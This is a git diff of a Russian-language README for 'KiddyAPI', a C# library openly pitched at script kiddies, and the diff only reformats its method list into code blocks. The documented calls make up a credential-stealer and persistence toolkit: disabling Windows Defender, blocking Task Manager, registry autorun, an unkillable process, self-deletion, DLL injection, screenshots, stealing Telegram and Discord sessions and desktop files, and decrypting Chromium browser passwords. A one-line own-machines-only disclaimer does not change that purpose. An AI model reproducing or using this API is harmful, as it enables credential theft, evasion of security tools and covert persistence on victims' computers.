@@ -8,50 +8,79 @@ KiddyAPI создана от "скрипт-кидди" для "скрипт-ки
 Использовать только на своих компьютерах или с разрешения пользователя
 ## Нэймспэйсы и методы :
 ### Info:
-Получаем активное окно пользователя по заголовку - `CheckWindow.GetWindow("example");`
-
-Задаем новый пароль на Windows - `SystemWork.ChangeWinPass("example");`
-
-Получаем внешний IP адрес - `SystemWork.GetIP();`
-
-Получаем информацию о необходимых модулях - `SystemWork.GetInfo(WinClass,ClassItem);`
-
-Получаем MAC-адресс - `SystemWork.GetMacAddress();`
-
-Получаем скриншот экрана - `SystemWork.GetScreen("C:\\example")`;
-
+Получаем активное окно пользователя по заголовку :
+```C# 
+CheckWindow.GetWindow("example");
+```
+Задаем новый пароль на Windows :
+```C# 
+SystemWork.ChangeWinPass("example");
+```
+Получаем внешний IP адрес :
+```C# 
+SystemWork.GetIP();
+``` 
+Получаем информацию о необходимых модулях :
+```C# 
+SystemWork.GetInfo(WinClass,ClassItem);
+```
+Получаем MAC-адресс : 
+```C# 
+SystemWork.GetMacAddress();
+``` 
+Получаем скриншот экрана :
+```C# 
+SystemWork.GetScreen("C:\\example");
+```
 ### Injector:
-Инжектим в процесс C++ DLL - `Injector.Execute(pathToDLL, Process);`
-
+Инжектим в процесс C++ DLL :
+```C# 
+Injector.Execute(pathToDLL, Process);
+```
 ### Config:
 Класс для дальнейших наработок, пока особо ничего в него не писал
 
-Проверяем, под админом ли запущенны - `if(Config.IsAdmin) { blablabla } `
-
+Проверяем, под админом ли запущенны :
+```C#  
+if(Config.IsAdmin) { blablabla } 
+```
 ### Protect:
 Отключаем Windows Defender - `DisableDefender.FirstRun();` - Используется при первом запуске программы,
 затем используем `DisableDefender.CheckDefender();` в бесконечном цикле, для того что бы проверять, не изменились ли параметры
 
-Закрываем программу, если запущен какой то процесс - `HideModule.CheckProcess("example");`
-
-Блокируем/Разблокируем Диспетчер задач - `HideModule.EnableTaskManager(true/false);`
-
-Самоудаляемся - HideModule.Suicide(pathToOwnExe);`
-
-Добавляем в автозагрузку( через реестр ) - `HideModule.SetAutorun(имя, которое будет отображаться в реестре, pathToFile);`
-
-Делаем процесс невозможным убить в Диспетчере задач - `ProcessProtect.Protect();`
-
+Закрываем программу, если запущен какой то процесс :
+```C# 
+HideModule.CheckProcess("example");
+```
+Блокируем/Разблокируем Диспетчер задач :
+```C#
+ HideModule.EnableTaskManager(true/false);
+```
+Самоудаляемся : 
+```C# 
+HideModule.Suicide(pathToOwnExe);`
+```
+Добавляем в автозагрузку( через реестр ) :
+```C# 
+HideModule.SetAutorun(имя, которое будет отображаться в реестре, pathToFile);
+```
+Делаем процесс невозможным убить в Диспетчере задач :
+```C# 
+ProcessProtect.Protect();
+```
 ### Steal :
 
 Тут мы копируем файлы с рабочего стола/сессию Дискорда/сессию Телеграмма
 
 Общий вид такой :
+```C# 
+ Apps.Desktop/Telegram/Discord/.Steal(pathToCopy, true/false(перезапись старых файлов, если уже есть);
+```
 
- `Apps.Desktop/Telegram/Discord/.Steal(pathToCopy, true/false(перезапись старых файлов, если уже есть);`
-
-Расшифровываем пароли с ChromiumBased браузеров - `Browsers.DecryptBrowsers(пароль из бд,энтропия);` 
-
+Расшифровываем пароли с ChromiumBased браузеров - 
+```C# 
+`Browsers.DecryptBrowsers(пароль из бд,энтропия);` 
+```
 Граббер добавлять не стал, так как это уже жирно. Декрипт происходит через WinAPI функцию.
 
 
